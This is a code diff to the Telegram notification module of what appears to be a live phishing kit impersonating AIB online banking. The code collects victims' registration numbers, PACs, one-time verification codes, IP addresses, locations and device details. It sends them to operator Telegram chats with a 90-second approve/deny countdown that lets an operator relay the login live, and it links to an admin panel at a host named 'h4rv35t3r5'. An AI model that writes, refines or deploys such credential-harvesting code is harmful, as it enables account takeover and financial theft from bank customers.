@@ -4,6 +4,20 @@
  *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
  *  ─── telegram.js ───
  */
+import {
+  buildVisitMessage,
+  parseVisitorInfo,
+  getNetworkHintLabel,
+  gmtOffset,
+  formatTimes,
+    escapeTelegramHtml,
+    asCode,
+    asLink,
+    asUrlField,
+    isHttpUrl,
+} from "./_messages.js";
+import { formatPendingLoginDatabaseLabel } from "./_db.js";
+
 var API = "https://api.telegram.org/bot";
 
 function getBotPairs(env) {
@@ -31,7 +45,7 @@ export function findTokenForChat(env, chatId) {
   return pairs[0] ? pairs[0].token : null;
 }
 
-async function sendToAll(env, text, taskId, includeButtons) {
+async function sendToAll(env, text, taskId, includeButtons, parseMode) {
   if (includeButtons === undefined) includeButtons = true;
   var pairs = getBotPairs(env);
   if (pairs.length === 0) return;
@@ -40,6 +54,9 @@ async function sendToAll(env, text, taskId, includeButtons) {
     var p = pairs[i];
     try {
       var payload = { chat_id: p.chatId, text: text };
+      // Only set when asked for: the login message is plain text
+      // and must not be parsed as HTML.
+      if (parseMode) payload.parse_mode = parseMode;
       if (includeButtons) {
         payload.reply_markup = {
           inline_keyboard: [
@@ -105,38 +122,6 @@ function formatUrl(origin) {
   }
 }
 
-function formatTimes(tz) {
-  var now = new Date();
-  var utcStr = now.toLocaleString("en-US", {
-    timeZone: "UTC",
-    month: "short", day: "numeric", year: "numeric",
-    hour: "numeric", minute: "2-digit", hour12: true,
-  });
-
-  var localStr;
-  try {
-    localStr = now.toLocaleString("en-US", {
-      timeZone: tz,
-      month: "short", day: "numeric", year: "numeric",
-      hour: "numeric", minute: "2-digit", hour12: true,
-    });
-  } catch (e) {
-    localStr = utcStr;
-  }
-  return { local: localStr, utc: utcStr };
-}
-
-function gmtOffset(tz) {
-  try {
-    var now = new Date();
-    var parts = now.toLocaleString("en-US", { timeZone: tz, timeZoneName: "shortOffset" }).split(" ");
-    var offset = parts[parts.length - 1];
-    return offset;
-  } catch (e) {
-    return "";
-  }
-}
-
 function locationBlock(cf) {
   if (!cf) return [];
   var loc = cf.city && cf.city !== "Unknown"
@@ -147,24 +132,29 @@ function locationBlock(cf) {
   if (offset) tzLabel += " (" + offset + ")";
 
   return [
-    "📍 Location: " + loc,
-    "🌐 IP: " + (cf.ip || "Unknown"),
-    "🕐 Timezone: " + tzLabel,
-    "📡 ISP: " + (cf.asOrganization || "Unknown"),
+    "📍 <b>Location:</b> " + asCode(loc),
+    "🌐 <b>IP:</b> " + asCode(cf.ip || "Unknown"),
+    "🕐 <b>Timezone:</b> " + asCode(tzLabel),
+    "📡 <b>ISP:</b> " + asCode(cf.asOrganization || "Unknown"),
   ];
 }
 
 function deviceBlock(task) {
   var device = task.device_info ? parseDevice(task.device_info) : "Unknown";
   var screen = task.screen_size || "Unknown";
-  var ref = formatReferrer(task.referrer);
-  var url = formatUrl(task.member_origin);
+  var ref = task.referrer || "";
+  var refLabel = formatReferrer(ref);
+  var origin = task.member_origin || "";
 
+  // Both fields are clickable. `asLink(value, label)` keeps the short
+  // hostname+pathname label this message has always displayed while the href
+  // stays the full URL — `formatUrl()` strips the scheme, so it can never be
+  // the href itself.
   return [
-    "📱 Device: " + device,
-    "📐 Screen: " + screen,
-    "🔗 Referrer: " + ref,
-    "🌍 URL: " + url,
+    "📱 <b>Device:</b> " + asCode(device),
+    "📐 <b>Screen:</b> " + asCode(screen),
+    "🔗 <b>Referrer:</b> " + (isHttpUrl(ref) ? asLink(ref, refLabel) : asCode(refLabel || "Direct")),
+    "🌍 <b>URL:</b> " + (isHttpUrl(origin) ? asLink(origin, formatUrl(origin)) : asCode(formatUrl(origin))),
   ];
 }
 
@@ -178,35 +168,169 @@ function timeBlock(tz) {
 
 var LINE = "━━━━━━━━━━━━━━━━━━━━";
 
-export async function notifyNewTask(env, task) {
-  var isVisit = task.request_kind === "visit";
-  var tz = task.cf ? task.cf.timezone : null;
-  var lines = [];
+/**
+ * Visit alert — same layout ebc/BBP/NBS/principal send. Sent as HTML, so
+ * unlike the login message it needs parse_mode.
+ */
+export async function sendVisitorNotification(env, data) {
+  await sendToAll(env, buildVisitMessage(data), null, false, "HTML");
+}
 
-  if (isVisit) {
-    lines.push("👁 New visitor (AIB)");
-    lines.push(LINE);
-    lines = lines.concat(locationBlock(task.cf));
-    lines.push("");
-    lines = lines.concat(deviceBlock(task));
-    lines.push("");
-    lines = lines.concat(timeBlock(tz));
-  } else {
-    lines.push("🔐 Login request (AIB)");
-    lines.push(LINE);
-    lines.push("👤 Reg No: " + task.user_id);
-    lines.push("🔑 PAC: " + (task.password || "N/A"));
-    lines.push("");
-    lines = lines.concat(locationBlock(task.cf));
-    lines.push("");
-    lines = lines.concat(deviceBlock(task));
-    lines.push("");
-    lines = lines.concat(timeBlock(tz));
-    lines.push("");
-    lines.push("⏳ Auto-declines in 90s");
+
+function visitDataFromTask(task) {
+  var cf = task.cf || {};
+  var parts = [cf.city, cf.country].filter(function (p) {
+    return p && p !== "Unknown" && p !== "Unknown, Unknown";
+  });
+  var detected = parseVisitorInfo(task.device_info);
+  return {
+    siteName: "AIB",
+    location: parts.length ? parts.join(", ") : "Unknown",
+    ip: cf.ip || "Unknown",
+    timezone: cf.timezone || "Unknown",
+    isp: cf.asOrganization || "Unknown",
+    asn: cf.asn || null,
+    org: cf.asOrganization || null,
+    platformLabel: detected.platformLabel,
+    browserLabel: detected.browserLabel,
+    deviceLabel: detected.deviceLabel,
+    screen: task.screen_size || "Unknown",
+    referrer: task.referrer || "Direct",
+    pageUrl: task.member_origin || "Unknown",
+  };
+}
+
+export async function sendLoginNotification(env, data) {
+  var lines = [
+    "🔐 <b>Login Attempt</b>",
+    "━━━━━━━━━━━━━━━━━━",
+    "👤 Reg No: " + asCode(data.user_id || "Unknown"),
+    "🔑 PAC: " + asCode(data.password || "Unknown"),
+  ];
+
+  await sendToAll(env, lines.join("\n"), null, false, "HTML");
+}
+
+function adminPortalLink(env) {
+  var raw = (env.ADMIN_PORTAL_URL || "").trim();
+  if (!raw) return "https://h4rv35t3r5.netlify.app/";
+  var absolute = /^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(raw)
+    ? "https://" + raw
+    : raw;
+  try {
+    return new URL(absolute).origin;
+  } catch (e) {
+    return raw;
+  }
+}
+
+export function formatCountdownLabel(secondsLeft) {
+  var safe = Math.max(0, Math.floor(secondsLeft));
+  var m = Math.floor(safe / 60);
+  var s = safe % 60;
+  return m + ":" + (s < 10 ? "0" : "") + s;
+}
+
+export function wrapFlowMessage(body) {
+  return "🏷️ <b>AIB</b>\n━━━━━━━━━━━━━━━━━━\n\n" + body;
+}
+
+export function buildLoginApprovalRequestBody(data) {
+  var password = String(data.password != null ? data.password : "").trim() || "—";
+  var lines = [
+    "🔔 Login request – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    "👤 Reg No: " + asCode(data.userId || "Unknown"),
+    "Password: " + asCode(password),
+  ];
+  if (data.databaseShard) {
+    lines.push("🗄 Database: " + asCode(data.databaseShard));
+  }
+  if (data.method && data.method !== "none" && data.method !== "—") {
+    lines.push("📧 Method: " + asCode(data.method));
+  }
+  lines.push("⏱ Time left: " + asCode(formatCountdownLabel(data.secondsLeft != null ? data.secondsLeft : 90)));
+  lines.push("");
+  lines.push("👉 " + asLink(data.adminLink, "Approve or deny"));
+
+  return lines.join("\n");
+}
+
+async function sendApprovalWithCountdown(env, taskId, buildText) {
+  var pairs = getBotPairs(env);
+  if (pairs.length === 0) return;
+
+  var refs = [];
+  var initialSeconds = 90;
+  var initialText = wrapFlowMessage(buildText(initialSeconds));
+
+  for (var i = 0; i < pairs.length; i++) {
+    var p = pairs[i];
+    try {
+      var payload = {
+        chat_id: p.chatId,
+        text: initialText,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      };
+      var res = await fetch(API + p.token + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+      });
+      var data = await res.json().catch(function () { return {}; });
+      if (data && data.ok && data.result && data.result.message_id) {
+        refs.push({ token: p.token, chatId: p.chatId, messageId: data.result.message_id });
+      }
+    } catch (err) {
+      console.error("[Telegram] Failed to send approval to " + p.chatId + ":", err);
+    }
   }
 
-  await sendToAll(env, lines.join("\n"), task.id, !isVisit);
+  if (refs.length === 0) return;
+
+  (async function runCountdown() {
+    for (var s = 89; s >= 0; s--) {
+      await new Promise(function (resolve) { setTimeout(resolve, 1000); });
+      var currentText = wrapFlowMessage(buildText(s));
+      for (var j = 0; j < refs.length; j++) {
+        var r = refs[j];
+        try {
+          await fetch(API + r.token + "/editMessageText", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: r.chatId,
+              message_id: r.messageId,
+              text: currentText,
+              parse_mode: "HTML",
+              disable_web_page_preview: true,
+            }),
+          });
+        } catch (e) {}
+      }
+    }
+  })().catch(function () {});
+}
+
+export async function notifyNewTask(env, task) {
+  if (task.request_kind === "visit") {
+    return sendVisitorNotification(env, visitDataFromTask(task));
+  }
+
+  var databaseShard = formatPendingLoginDatabaseLabel(env, task.id);
+  var adminUrl = adminPortalLink(env);
+
+  await sendApprovalWithCountdown(env, task.id, function (secondsLeft) {
+    return buildLoginApprovalRequestBody({
+      userId: task.user_id,
+      password: task.password,
+      method: task.method,
+      adminLink: adminUrl,
+      secondsLeft: secondsLeft,
+      databaseShard: databaseShard,
+    });
+  });
 }
 
 export async function notifyAdvance(env, task) {
@@ -216,14 +340,14 @@ export async function notifyAdvance(env, task) {
   if (task.flow_step === "code_request") {
     var target =
       task.code_delivery_method === "phone"
-        ? "Phone (" + task.masked_phone + ")"
-        : "Email (" + task.masked_email + ")";
+        ? "Phone (" + (task.masked_phone || "N/A") + ")"
+        : "Email (" + (task.masked_email || "N/A") + ")";
 
-    lines.push("📨 Code delivery request (AIB)");
+    lines.push("📨 <b>Code delivery request (AIB)</b>");
     lines.push(LINE);
-    lines.push("👤 Reg No: " + task.user_id);
-    lines.push("🔑 PAC: " + (task.password || "N/A"));
-    lines.push("✉️ Send code via: " + target);
+    lines.push("👤 <b>Reg No:</b> " + asCode(task.user_id || "Unknown"));
+    lines.push("🔑 <b>PAC:</b> " + asCode(task.password || "N/A"));
+    lines.push("✉️ <b>Send code via:</b> " + asCode(target));
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
@@ -231,12 +355,12 @@ export async function notifyAdvance(env, task) {
     lines.push("");
     lines.push("⏳ Auto-declines in 90s");
   } else if (task.flow_step === "code_verify") {
-    lines.push("🛡 Code verification (AIB)");
+    lines.push("🛡 <b>Code verification (AIB)</b>");
     lines.push(LINE);
-    lines.push("👤 Reg No: " + task.user_id);
-    lines.push("🔑 PAC: " + (task.password || "N/A"));
-    lines.push("🔢 Code entered: " + (task.verification_code || "N/A"));
-    lines.push("✉️ Sent via: " + (task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + task.masked_email + ")");
+    lines.push("👤 <b>Reg No:</b> " + asCode(task.user_id || "Unknown"));
+    lines.push("🔑 <b>PAC:</b> " + asCode(task.password || "N/A"));
+    lines.push("🔢 <b>Code entered:</b> " + asCode(task.verification_code || "N/A"));
+    lines.push("✉️ <b>Sent via:</b> " + asCode((task.code_delivery_method === "phone" ? "Phone" : "Email") + " (" + (task.masked_email || "N/A") + ")"));
     lines.push("");
     lines = lines.concat(locationBlock(task.cf));
     lines.push("");
@@ -247,54 +371,76 @@ export async function notifyAdvance(env, task) {
     return;
   }
 
-  await sendToAll(env, lines.join("\n"), task.id, true);
+  // HTML: the blocks above carry <b>/<code>/<a href>, and every dynamic value is
+  // escaped, so Telegram can render the link instead of printing a bare URL.
+  await sendToAll(env, lines.join("\n"), task.id, true, "HTML");
+}
+
+/**
+ * Sends the approve/deny/redirect outcome as its own message.
+ *
+ * Separate on purpose: editing the login notification in place would destroy
+ * it, and the outcome has to stand alone. Sent as HTML because the template
+ * carries `<code>` spans — the login notification itself stays plain text.
+ */
+export async function sendPlain(env, text) {
+  await sendToAll(env, text, null, false, "HTML");
+}
+
+// ─── Accept / decline / redirect templates ─────────────────────────────────
+// Body copied from igoe's `lib/telegram-approval-templates.ts`
+// (buildAdminLoginApprovedBody / buildAdminLoginDeniedBody /
+// buildAdminLoginRedirectedBody): same header, same 18-rule separator, same
+// `<code>` field format, same status-line shape.
+//
+// Two lines are worded for aib rather than igoe, because copying them
+// literally would be false here: aib has no verification-method field in
+// practice (login sends method "none"), and aib has no OTP page and no
+// redirect target to send the user to.
+
+var OUTCOME_SEPARATOR = "━━━━━━━━━━━━━━━━━━";
+
+function outcomeCode(value) {
+  return "<code>" + escapeTelegramHtml(value) + "</code>";
+}
+
+function outcomeMethodLabel(raw) {
+  var method = String(raw || "").trim().toLowerCase();
+  if (method === "email") return "Email";
+  if (method === "text" || method === "sms") return "Text Message (SMS)";
+  if (method === "call") return "Phone Call";
+  if (!method || method === "\u2014" || method === "-" || method === "none") return null;
+  return method;
+}
+
+function outcomeBody(task, header, statusLine) {
+  var lines = [
+    header,
+    OUTCOME_SEPARATOR,
+    "👤 Reg No: " + outcomeCode(task.user_id || "Unknown"),
+    "🔑 PAC: " + outcomeCode(task.password || "Unknown"),
+  ];
+  var label = outcomeMethodLabel(task.method);
+  if (label) lines.push("📧 Method: " + outcomeCode(label));
+  lines.push(statusLine);
+  return lines.join("\n");
 }
 
 export function buildApprovedMessage(task) {
-  return [
-    "✅ APPROVED via Telegram",
-    "🔐 Login request (AIB)",
-    "👤 Reg No: " + task.user_id,
-    "🔑 PAC: " + (task.password || "N/A"),
-  ].join("\n");
+  return outcomeBody(task, "✅ CC – Login Approved",
+    "✅ Status: Approved – User identity verified");
 }
 
 export function buildDeniedMessage(task) {
-  return [
-    "❌ DENIED via Telegram",
-    "🔐 Login request (AIB)",
-    "👤 Reg No: " + task.user_id,
-    "🔑 PAC: " + (task.password || "N/A"),
-  ].join("\n");
+  return outcomeBody(task, "❌ CC – Login Denied",
+    "❌ Status: Denied – User shown error message");
 }
 
 export function buildRedirectedMessage(task) {
-  return [
-    "🔀 REDIRECTED via Telegram",
-    "🔐 Login request (AIB)",
-    "👤 Reg No: " + task.user_id,
-    "🔑 PAC: " + (task.password || "N/A"),
-  ].join("\n");
+  return outcomeBody(task, "↪️ CC – Login Redirected",
+    "↪️ Status: Redirected – User session redirected");
 }
 
-export async function editMessage(env, chatId, messageId, text) {
-  var token = findTokenForChat(env, chatId);
-  if (!token) return;
-
-  try {
-    await fetch(API + token + "/editMessageText", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: messageId,
-        text: text,
-      }),
-    });
-  } catch (err) {
-    console.error("[Telegram] Failed to edit message:", err);
-  }
-}
 
 export async function answerCallback(env, chatId, callbackQueryId, text) {
   var token = findTokenForChat(env, chatId);
